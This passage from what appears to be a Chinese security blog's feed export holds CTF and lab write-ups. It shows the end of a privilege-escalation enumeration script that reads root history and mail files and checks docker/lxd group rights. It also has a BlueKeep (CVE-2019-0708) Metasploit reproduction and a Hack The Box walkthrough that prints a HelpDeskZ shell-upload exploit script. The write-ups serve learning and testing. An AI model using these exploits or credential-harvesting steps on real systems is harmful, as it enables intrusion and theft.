keyword">echo</span> -e <span class="token string">"[-] Can't search *.ini files as no keyword was entered\n"</span>   <span class="token keyword">else</span>    inikey<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -maxdepth 4 -name *.ini -type f -exec <span class="token function">grep</span> -Hn $keyword <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$inikey</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Find keyword (<span class="token variable">$keyword</span>) in .ini files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n<span class="token variable">$inikey</span>"</span>       <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>      <span class="token keyword">else</span>     <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Find keyword (<span class="token variable">$keyword</span>) in .ini files (recursive 4 levels):\e[00m"</span>     <span class="token keyword">echo</span> -e <span class="token string">"'<span class="token variable">$keyword</span>' not found in any .ini files"</span>     <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>    <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$keyword</span>"</span> <span class="token operator">=</span> <span class="token string">""</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>  <span class="token keyword">:</span>  <span class="token keyword">else</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$inikey</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      inikey<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -maxdepth 4 -name *.ini -type f -exec <span class="token function">grep</span> -lHn $keyword <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span>      <span class="token function">mkdir</span> --parents <span class="token variable">$format</span>/keyword_file_matches/ini_files/ 2<span class="token operator">></span>/dev/null      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$inikey</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/keyword_file_matches/ini_files/ <span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#quick extract of .conf files from /etc - only 1 level</span>allconf<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /etc/ -maxdepth 1 -name *.conf -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$allconf</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] All *.conf files in /etc (recursive 1 level):\e[00m\n<span class="token variable">$allconf</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$allconf</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/conf-files/ 2<span class="token operator">></span>/dev/null  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$allconf</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/conf-files/<span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#extract any user history files that are accessible</span>usrhist<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -la ~/.*_history 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$usrhist</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Current user's history files:\e[00m\n<span class="token variable">$usrhist</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$usrhist</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/history_files/ 2<span class="token operator">></span>/dev/null  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$usrhist</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/history_files/<span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#can we read roots *_history files - could be passwords stored etc.</span>roothist<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -la /root/.*_history 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$roothist</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Root's history files are accessible!\e[00m\n<span class="token variable">$roothist</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$roothist</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/history_files/ 2<span class="token operator">></span>/dev/null  <span class="token function">cp</span> <span class="token variable">$roothist</span> <span class="token variable">$format</span>/history_files/ 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#all accessible .bash_history files in /home</span>checkbashhist<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /home -name .bash_history -print -exec <span class="token function">cat</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$checkbashhist</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Location and contents (if accessible) of .bash_history file(s):\e[00m\n<span class="token variable">$checkbashhist</span>"</span>  <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#is there any mail accessible</span>readmail<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -la /var/mail 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$readmail</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Any interesting mail in /var/mail:\e[00m\n<span class="token variable">$readmail</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#can we read roots mail</span>readmailroot<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">head</span> /var/mail/root 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$readmailroot</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] We can read /var/mail/root! (snippet below)\e[00m\n<span class="token variable">$readmailroot</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$readmailroot</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/mail-from-root/ 2<span class="token operator">></span>/dev/null  <span class="token function">cp</span> <span class="token variable">$readmailroot</span> <span class="token variable">$format</span>/mail-from-root/ 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token punctuation">}</span>docker_checks<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">#specific checks - check to see if we're in a docker container</span>dockercontainer<span class="token operator">=</span>` <span class="token function">grep</span> -i docker /proc/self/cgroup  2<span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token function">find</span> / -name <span class="token string">"*dockerenv*"</span> -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$dockercontainer</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Looks like we're in a Docker container:\e[00m\n<span class="token variable">$dockercontainer</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#specific checks - check to see if we're a docker host</span>dockerhost<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>docker --version 2<span class="token operator">></span>/dev/null<span class="token punctuation">;</span> docker <span class="token function">ps</span> -a 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$dockerhost</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Looks like we're hosting Docker:\e[00m\n<span class="token variable">$dockerhost</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#specific checks - are we a member of the docker group</span>dockergrp<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">id</span> <span class="token operator">|</span> <span class="token function">grep</span> -i docker 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$dockergrp</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] We're a member of the (docker) group - could possibly misuse these rights!\e[00m\n<span class="token variable">$dockergrp</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#specific checks - are there any docker files present</span>dockerfiles<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -name Dockerfile -exec <span class="token function">ls</span> -l <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$dockerfiles</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Anything juicy in the Dockerfile:\e[00m\n<span class="token variable">$dockerfiles</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#specific checks - are there any docker files present</span>dockeryml<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -name docker-compose.yml -exec <span class="token function">ls</span> -l <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$dockeryml</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Anything juicy in docker-compose.yml:\e[00m\n<span class="token variable">$dockeryml</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token punctuation">}</span>lxc_container_checks<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">#specific checks - are we in an lxd/lxc container</span>lxccontainer<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> -qa container<span class="token operator">=</span>lxc /proc/1/environ 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$lxccontainer</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Looks like we're in a lxc container:\e[00m\n<span class="token variable">$lxccontainer</span>"</span>  <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#specific checks - are we a member of the lxd group</span>lxdgroup<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">id</span> <span class="token operator">|</span> <span class="token function">grep</span> -i lxd 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$lxdgroup</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] We're a member of the (lxd) group - could possibly misuse these rights!\e[00m\n<span class="token variable">$lxdgroup</span>"</span>  <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token punctuation">}</span>footer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m### SCAN COMPLETE ####################################\e[00m"</span> <span class="token punctuation">}</span>call_each<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  header  debug_info  system_info  user_info  environmental_info  job_info  networking_info  services_info  software_configs  interesting_files  docker_checks  lxc_container_checks  footer<span class="token punctuation">}</span><span class="token keyword">while</span> <span class="token function">getopts</span> <span class="token string">"h:k:r:e:st"</span> option<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token keyword">case</span> <span class="token string">"<span class="token variable">${option}</span>"</span> <span class="token keyword">in</span>    k<span class="token punctuation">)</span> keyword<span class="token operator">=</span><span class="token variable">${OPTARG}</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    r<span class="token punctuation">)</span> report<span class="token operator">=</span><span class="token variable">${OPTARG}</span><span class="token string">"-"</span>`date +<span class="token string">"%d-%m-%y"</span>`<span class="token punctuation">;</span><span class="token punctuation">;</span>    e<span class="token punctuation">)</span> export<span class="token operator">=</span><span class="token variable">${OPTARG}</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    s<span class="token punctuation">)</span> sudopass<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token punctuation">;</span>    t<span class="token punctuation">)</span> thorough<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token punctuation">;</span>    h<span class="token punctuation">)</span> usage<span class="token punctuation">;</span> <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    *<span class="token punctuation">)</span> usage<span class="token punctuation">;</span> <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">;</span> esac<span class="token keyword">done</span>call_each <span class="token operator">|</span> <span class="token function">tee</span> -a <span class="token variable">$report</span> 2<span class="token operator">></span> /dev/null<span class="token comment" spellcheck="true">#EndOfScript</span></code></pre><p>发现 <code>SUID files</code> 存在 <code>emergency</code> 可执行文件，尝试执行，发现是一个紧急情况下的 <code>root shell</code>，直接查看 <code>root.txt</code> 获得第二个flag。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909211732.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190909211921.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-0708远程桌面代码执行漏洞复现</title>
      <link href="/2019/09/07/cve-2019-0708-yuan-cheng-zhuo-mian-dai-ma-zhi-xing-lou-dong-fu-xian/"/>
      <url>/2019/09/07/cve-2019-0708-yuan-cheng-zhuo-mian-dai-ma-zhi-xing-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2019-0708远程桌面代码执行漏洞复现"><a href="#CVE-2019-0708远程桌面代码执行漏洞复现" class="headerlink" title="CVE-2019-0708远程桌面代码执行漏洞复现"></a>CVE-2019-0708远程桌面代码执行漏洞复现</h1><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><blockquote><p>目标机IP: 172.16.105.129<br>攻击机IP：172.16.105.1</p></blockquote><p>在 mac 下使用 VMware Fusion 安装 Windows7 SP1，下载链接如下：<br>Windows7 SP1 下载链接:<br>ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</p><p><code>注意：</code> 由于目前 exp 只支持如下版本的系统，因此安装其它版本的系统可能无法利用。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190907104449.png-water_print" alt=""></p><p>打开 win7 的远程桌面功能：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190907104603.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190907104609.png-water_print" alt=""></p><h2 id="msf-环境准备"><a href="#msf-环境准备" class="headerlink" title="msf 环境准备"></a>msf 环境准备</h2><p>下载 <a href="https://github.com/rapid7/metasploit-framework/pull/12283/files" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/12283/files</a> 中的攻击套件放置文件到msf的相应文件夹(如果已存在同名文件,直接覆盖即可)</p><pre><code>rdp.rb   -&gt;   /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rbrdp_scanner.rb   -&gt;   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rbcve_2019_0708_bluekeep.rb   -&gt;   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb   -&gt;   /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</code></pre><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>进入 <code>msfconsole</code><br>进入以后使用 <code>reload_all</code> 重新加载 <code>0708RDP</code> 利用模块<br>使用 <code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code> 启用 <code>0708RDP</code> 攻击模块<br>使用 <code>show option</code>s` 查看需要配置的选项：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190907105018.png-water_print" alt=""></p><h3 id="使用默认的-shell"><a href="#使用默认的-shell" class="headerlink" title="使用默认的 shell"></a>使用默认的 shell</h3><p>填写配置信息，并执行攻击：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190907105213.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190907105225.png-water_print" alt=""></p><h3 id="使用-meterpreter-的-shell"><a href="#使用-meterpreter-的-shell" class="headerlink" title="使用 meterpreter 的 shell"></a>使用 meterpreter 的 shell</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190907105333.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190907105353.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190907105359.png-water_print" alt=""></p><p><code>注意：</code> 请在两次攻击之间重启目标机，否则会出现攻击失败的现象！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box —— Help</title>
      <link href="/2019/09/06/hackthebox-help/"/>
      <url>/2019/09/06/hackthebox-help/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box-——-Help"><a href="#Hack-The-Box-——-Help" class="headerlink" title="Hack The Box —— Help"></a>Hack The Box —— Help</h1><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183320.png-water_print" alt=""></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre><code>nmap -T4 -A -v 10.10.10.121</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183229.png-water_print" alt=""></p><p>发现 22、80、3000 端口开放，访问 80 端口，是一个 apache 默认页面。</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>利用 <code>dirbuster</code> 爆破目录：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183610.png-water_print" alt=""></p><p>发现 <code>support</code> 目录，访问得到：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183647.png-water_print" alt=""></p><p>搜索 helpdeskz 相关漏洞，发现一处任意文件上传漏洞：<a href="https://www.exploit-db.com/exploits/40300" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40300</a></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">print</span> <span class="token string">'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'</span><span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">"Usage: {} [baseUrl] [nameOfUploadedFile]"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>helpdeskzBaseUrl <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>fileName <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>currentTime <span class="token operator">=</span> int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    plaintext <span class="token operator">=</span> fileName <span class="token operator">+</span> str<span class="token punctuation">(</span>currentTime <span class="token operator">-</span> x<span class="token punctuation">)</span>    md5hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> helpdeskzBaseUrl<span class="token operator">+</span>md5hash<span class="token operator">+</span><span class="token string">'.php'</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>head<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"found!"</span>        <span class="token keyword">print</span> url        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"Sorry, I did not find anything"</span></code></pre><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先，在 submit a ticket 处上传一个反弹 shell 的脚本文件：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906184143.png-water_print" alt=""></p><p>返回：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906184233.png-water_print" alt=""></p><p>然后，执行 exp 脚本：</p><pre class=" language-bash"><code class="language-bash">python2 poc.py http://10.10.10.121/support/uploads/tickets/ 1.php</code></pre><p>但是此处无论如何都不能访问到 shell，后来经过查询相关资料得知：由于服务器所在地区的时区与国内的时区不一样导致 <code>current - x</code> 得到的数不正确，因此，将脚本稍作改动：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> time<span class="token punctuation">,</span> calendar<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">print</span> <span class="token string">'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'</span><span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">"Usage: {} [baseUrl] [nameOfUploadedFile]"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>helpdeskzBaseUrl <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>fileName <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># currentTime = int(time.time())</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>head<span class="token punctuation">(</span>helpdeskzBaseUrl<span class="token punctuation">)</span>serverTime <span class="token operator">=</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Date"</span><span class="token punctuation">]</span><span class="token keyword">print</span> serverTimetimeFormat <span class="token operator">=</span> <span class="token string">"%a, %d %b %Y %H:%M:%S %Z"</span>currentTime <span class="token operator">=</span> int<span class="token punctuation">(</span>calendar<span class="token punctuation">.</span>timegm<span class="token punctuation">(</span>time<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>serverTime<span class="token punctuation">,</span> timeFormat<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> currentTime<span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    plaintext <span class="token operator">=</span> fileName <span class="token operator">+</span> str<span 